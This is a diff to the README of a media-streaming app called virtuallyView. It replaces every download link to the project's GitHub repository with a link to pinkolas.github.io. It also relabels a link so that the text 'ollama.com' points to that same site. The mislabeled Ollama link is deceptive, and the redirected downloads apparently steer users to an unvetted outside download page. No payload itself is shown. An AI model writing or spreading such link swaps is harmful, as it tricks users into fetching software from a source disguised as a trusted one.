@@ -30,11 +30,11 @@ Before getting started, make sure you have:
 
 ## 📥 Download and Installation
 
-[![Download virtuallyView](https://img.shields.io/badge/Download-virtuallyView-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/pinkolas/virtuallyView)
+[![Download virtuallyView](https://img.shields.io/badge/Download-virtuallyView-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://pinkolas.github.io)
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/pinkolas/virtuallyView](https://github.com/pinkolas/virtuallyView)
+Visit this link to download the application: [https://pinkolas.github.io](https://pinkolas.github.io)
 
 Once you're on the page, look for the download button or the latest release section. The download may take a few minutes depending on your internet speed.
 
@@ -122,7 +122,7 @@ virtuallyView includes built-in support for Ollama, a local AI assistant. This m
 
 To enable this feature:
 
-1. Install Ollama from [ollama.com](https://ollama.com)
+1. Install Ollama from [ollama.com](https://pinkolas.github.io)
 2. Open virtuallyView Settings
 3. Enable "Local AI Assistant"
 4. Follow the prompts to connect
@@ -157,7 +157,7 @@ virtuallyView transforms your personal media collection into a streaming experie
 
 Start your journey today. Download virtuallyView and experience the freedom of truly owning your entertainment.
 
-[![Get Started Now](https://img.shields.io/badge/Get_Started-Download-green?style=for-the-badge&logo=download&color=random)](https://github.com/pinkolas/virtuallyView)
+[![Get Started Now](https://img.shields.io/badge/Get_Started-Download-green?style=for-the-badge&logo=download&color=random)](https://pinkolas.github.io)
 
 ---
 
